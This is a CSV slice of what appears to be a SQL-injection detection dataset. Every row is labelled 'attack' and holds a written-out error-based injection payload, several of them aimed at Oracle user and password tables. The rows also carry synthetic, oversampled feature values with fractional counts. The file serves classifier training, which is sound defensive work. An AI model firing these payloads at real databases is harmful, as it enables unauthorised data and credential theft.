id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000176,attack,error,-7648'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,nearest_attack_euclidean,R000077,1.4549341832697646,334.27508797807235,30.77323313815836,3.226102470186988,73.1821554254389,44.72862170175563,158.1821554254389,58.18215542543891,0.21896045050768564,0.1336207791018535,0.47335072046315163,0.17406804992730926,0.5910777127194538,0.0,0.5910777127194538,0.0,5.551115123125783e-17,1.5910777127194538,0.0,33.40892228728055,0.0,0.0,0.0,22.182155425438907,0.5910777127194538,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5910777127194538,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.5910777127194535
SMOTE_000177,attack,error,"1   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  2230  =  2230",nearest_attack_euclidean,R000161,0.2373610337482245,219.6729685233324,28.06635157383338,3.2708231637767993,46.53081259066703,39.46918740933296,105.6729685233324,28.0,0.2121598575102795,0.17954957512278624,0.4807572637189594,0.12753330364797488,0.2654062953335192,0.0,0.0,0.0,1.0,2.0,0.0,19.73459370466648,0.0,0.0,4.0,3.0,0.06635157383337986,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000178,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000005,0.0,213.0,40.0,4.192633796617524,117.0,2.0,71.0,23.0,0.5492957746478874,0.009389671361502344,0.3333333333333333,0.107981220657277,3.0,0.0,0.0,0.0,5.551115123125783e-17,3.0,0.0,10.0,0.0,4.0,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000179,attack,error,"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'szib' like 'szib",nearest_attack_euclidean,R000240,1.1787050968913326,181.51876253356187,31.0,3.7804890387714143,64.0,24.0,70.59896877796824,22.919793755593645,0.3536022499389784,0.1326008437271169,0.38764716413941264,0.12614974219449207,3.080206244406353,0.919793755593647,0.0,0.0,5.551115123125783e-17,2.220446049250313e-16,0.0,14.919793755593647,0.0,0.0,4.0,0.0,0.7700515611015882,0.22994843889841177,0.0,-1.3877787807814457e-17,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0000000000000004
SMOTE_000180,attack,error,1'  )   as pogx where 4105  =  4105 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,nearest_attack_euclidean,R000293,0.058942725669729405,367.6304162447646,33.985785240183255,3.3971228898037427,85.88628192146604,52.92892620091628,167.8436376420158,60.97157048036651,0.23361568737326582,0.14396955870967346,0.4565578814132132,0.1658568725038475,0.985785240183255,0.0,2.0142147598167455,0.0,5.551115123125783e-17,2.985785240183255,0.0,32.985785240183255,0.0,0.0,0.0,25.0,0.985785240183255,0.0,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.985785240183255,0.0,0.985785240183255,0.014214759816745026,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.9857852401832545
SMOTE_000181,attack,error,"1'  )   as najc where 5213  =  5213 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000126,0.16502165673088068,179.1620766332838,34.12966130662702,3.872724769968317,60.162076633283775,31.967584673343246,65.96758467334325,21.06483065331351,0.3357811245858868,0.17843730884938547,0.36821413039627493,0.11756743616845272,1.0648306533135101,0.0,1.9351693466864903,0.0,5.551115123125783e-17,1.0,0.0,13.0,0.0,0.0,4.0,2.9675846733432447,1.0,0.0,0.967584673343245,0.03241532665675495,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.03241532665675506,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0324153266567553
SMOTE_000182,attack,error,"1'+  (  select 'bmit' where 3716  =  3716 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   +'",nearest_attack_euclidean,R000212,0.8732321391539705,342.1800327718976,39.68856674687177,3.9725086569066246,112.75426698748709,60.50853397497418,129.29436530317986,39.62286650625646,0.32959761857729514,0.17694998717462004,0.37767214900293145,0.11578024524515332,4.0,0.0,0.0,0.0,2.0,2.0,0.0,23.24573301251291,0.0,0.0,6.0,6.377133493743544,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.688566746871772,3.0,0.6885667468717722,1.0,1.3114332531282278,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.688566746871771
SMOTE_000183,attack,error,"-4291""   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""xyhi""  =  ""xyhi",nearest_attack_euclidean,R000048,0.2557316536662933,380.6690577571032,36.0,3.5006679236323945,93.49016413712171,52.20751367809348,169.34883890760761,65.62254103428043,0.24525204338493312,0.13725700042700878,0.44505711910640267,0.17243383708165547,0.0,3.9999999999999996,1.0,0.0,5.551115123125783e-17,2.896243160953262,0.0,34.415027356186954,0.0,0.0,0.896243160953262,24.51878419523369,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.103756839046738,0.0,0.0,1.103756839046738,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.207513678093476
SMOTE_000184,attack,error,1 where 5161  =  5161 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,nearest_attack_euclidean,R000119,0.7793546097959485,405.21850581506544,34.00268035616464,3.5068435049272875,102.49061875342376,58.498659821917684,177.23458795205332,66.99463928767072,0.2528059265265459,0.1446370425993312,0.43724049913700985,0.16531653173711305,0.2506700890411604,0.0,2.0,0.0,5.551115123125783e-17,3.0,0.0,36.49597946575304,0.0,0.0,0.2506700890411606,29.495979465753038,0.2506700890411603,0.0,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.7493299109588398,0.0,1.0,1.7493299109588398,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.49865982191768
SMOTE_000185,attack,error,"1""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""dtfg""  =  ""dtfg",nearest_attack_euclidean,R000091,1.5235340259788794,289.52924499942054,35.42353775002897,3.886474124084414,104.61169799976821,35.0,111.91754699965233,38.0,0.36127091333100175,0.12102839584061949,0.3862984324871347,0.13140225834124403,0.0,3.9999999999999996,0.0,0.0,2.0,2.0,0.0,21.152924499942053,0.8470755000579457,2.0,5.0,4.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000186,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'cipk'  =  'cipk",nearest_attack_euclidean,R000222,0.3263985381141282,165.406682572706,30.0,3.8415891577629755,48.17626730290824,35.70506921163296,59.820276846531826,21.70506921163296,0.2920209133867074,0.21603159864516785,0.36081225090654456,0.1311352370615802,4.0,0.0,0.0,0.0,5.551115123125783e-17,1.8237326970917607,0.0,10.705069211632956,0.0,0.0,5.17626730290824,1.823732697091761,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000187,attack,error,"1""   )    )    as vdbf where 7969  =  7969 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000045,0.6082201500918993,177.22734348489251,30.528417935611564,3.7414558638681634,45.585253806834686,43.0,67.11367174244626,21.528417935611564,0.2570315015987655,0.24300097874266274,0.37849951062866866,0.12146800902990315,0.0,0.7642089678057816,2.0,0.0,5.551115123125783e-17,2.0,0.0,11.764208967805782,0.0,0.0,5.0,4.0,0.0,0.7642089678057815,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000188,attack,error,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'ytlf'  =  'ytlf",nearest_attack_euclidean,R000057,0.03830710590331675,160.02321533464578,28.046430669291574,3.7933720244567977,47.02321533464579,35.09286133858315,56.90713866141685,21.0,0.29385183745399746,0.21929523592626948,0.3556218521642813,0.13123107445545182,4.0,0.0,0.0,0.0,5.551115123125783e-17,1.976784665354213,0.0,10.0,0.0,0.0,5.023215334645787,1.976784665354213,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000189,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""okpa""  =  ""okpa",nearest_attack_euclidean,R000221,0.3105479125348245,165.23445898570847,29.0,3.821291884861858,48.169378359428336,35.67751343771335,59.71005375085341,21.677513437713355,0.2922599306937139,0.216084739162895,0.360547468500034,0.1311078616433571,0.0,3.9999999999999996,0.0,0.0,5.551115123125783e-17,1.8306216405716618,0.0,10.677513437713353,0.0,0.0,5.169378359428338,1.8306216405716622,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000190,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000035,0.01885552842533285,209.0,41.08810562866146,4.22183139998089,113.0,2.0,71.0,23.0,0.5406698564593302,0.009569377990430616,0.3397129186602871,0.11004784688995216,3.0,0.0,0.0,0.0,5.551115123125783e-17,3.0,0.0,10.0,0.0,3.0,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000191,attack,error,"1  )   where 9338  =  9338 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000099,0.16983903319227645,166.87617882953492,29.234522353691865,3.776427312116165,41.703567061075596,43.93808941476746,61.0,20.234522353691865,0.24985690079056022,0.2632022793402218,0.3656876192467462,0.12125320062247186,0.0,0.0,2.0,0.0,5.551115123125783e-17,2.0,0.0,11.0,0.0,0.0,5.234522353691865,4.0,0.0,0.0,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000192,attack,error,"1'||  (  select 'rttq' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",nearest_attack_euclidean,R000046,0.025454341943059563,198.78660659864985,32.0,3.9587446928783483,55.91108608277077,46.92886886621662,67.96443443310831,27.982217216554155,0.28125268483989446,0.23607003988500158,0.34190829020719543,0.14076898506790855,4.0,0.0,0.0,0.0,5.551115123125783e-17,2.0,0.0,12.0,0.0,0.0,5.9822172165541545,6.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.9822172165541547,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.9822172165541545
SMOTE_000193,attack,error,"1""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""dzse""  =  ""dzse",nearest_attack_euclidean,R000279,1.188945359092779,203.03488915841433,28.290698451202047,3.443718916696427,50.01162971947144,33.70930154879795,91.02325943894289,28.290698451202047,0.24609485435463885,0.166827700309813,0.44774746470126353,0.1393299806342846,0.0,3.9999999999999996,0.0,0.0,0.4302328170673493,2.0,0.0,16.860465634134698,0.0,0.0,4.569767182932651,2.43023281706735,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.8604656341346986,0.0,0.0,0.43023281706734934,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.290698451202048
SMOTE_000194,attack,error,"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",nearest_attack_euclidean,R000237,1.0214056273770264,321.4899626143875,36.0,3.8169490217036977,99.6908486775141,59.50892980670425,127.90848677514093,34.38169735502819,0.31141623573849425,0.18518372830990626,0.3965667335560469,0.10683330239555261,0.0,0.0,0.0,0.0,2.0,1.5636162258380313,0.0,23.818081129190155,0.0,0.0,6.0,4.5636162258380315,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,0.5636162258380311,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.56361622583803
SMOTE_000195,attack,error,"1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'wzdo'  =  'wzdo",nearest_attack_euclidean,R000244,1.4874530478224897,301.55437234391337,37.0,3.838942970236635,104.31678419652192,38.68321580347807,121.31678419652192,37.23758814739145,0.3458090082978411,0.128655661227077,0.4022138990805237,0.12332143139455815,2.158392098260964,0.0,0.0,0.0,2.0,2.0,0.0,23.07919604913048,0.0,2.0,5.0,4.0,0.539598024565241,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000196,attack,error,"1""   )    )    as rcse where 4559  =  4559 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000072,0.6024411517857919,183.6446686363866,31.328933727277324,3.7804510350229843,48.0,42.50659940908402,70.64466863638661,22.493400590915982,0.261477103521447,0.2316701104936088,0.38443931879326027,0.12241346719168394,0.0,1.0,2.0,0.0,0.1644668636386612,2.0,0.0,12.328933727277322,0.0,0.0,4.835533136361339,4.164466863638662,0.0,1.0,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.3289337272773225,0.0,1.0,0.16446686363866136,0.8355331363613387,0.16446686363866136,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.493400590915984
SMOTE_000197,attack,error,1   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   5139  =  5139,nearest_attack_euclidean,R000213,0.10503534138861606,435.67457504437016,33.0,3.370125031481807,103.90301768617343,58.74138049646246,202.15948661350302,70.87069024823123,0.23853791302176974,0.13481024980547038,0.46396318399148045,0.16268865318127945,0.0,0.03232743794219217,0.0,0.0,5.551115123125783e-17,2.9676725620578077,0.0,41.87069024823123,0.0,0.0,0.0,28.967672562057807,0.0,0.03232743794219217,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,2.0,1.9676725620578077,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.967672562057808
SMOTE_000198,attack,error,"1' where 3612  =  3612 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000053,1.238054053818555,268.7757323807649,37.61098327379781,4.043469178646615,101.61098327379781,39.88786619038246,95.05491636898904,32.22196654759561,0.37832075391304143,0.1481053943135456,0.3536940113799619,0.11987984039345106,0.610983273797808,0.0,2.0,0.0,2.0,1.6109832737978078,0.0,18.0,0.0,2.0,5.0,5.6109832737978085,0.6109832737978078,0.0,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.6109832737978078,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.610983273797808
SMOTE_000199,attack,error,1%'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  '%'  =  ',nearest_attack_euclidean,R000249,0.46341873211796814,360.5897118566716,30.129485592833582,3.262167899724737,79.03588474266866,45.0,171.55382711400298,65.0,0.21912483530678217,0.12483715354593256,0.4757176782476049,0.18032033289968036,4.0,0.0,0.0,0.0,5.551115123125783e-17,3.0,0.0,34.258971185667164,1.7410288143328372,0.0,0.0,23.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000200,attack,error,"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'zypa'  =  'zypa",nearest_attack_euclidean,R000225,0.39630523770438436,319.52933313363087,38.0,4.009127059103947,110.09807416283073,55.0,118.2548145929232,36.17644437787696,0.3446895657022377,0.1721557227953317,0.36997202974373355,0.11318268175869703,4.0,0.0,0.0,0.0,2.0,1.7254814592923198,0.0,21.45096291858464,0.0,0.0,6.0,4.72548145929232,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
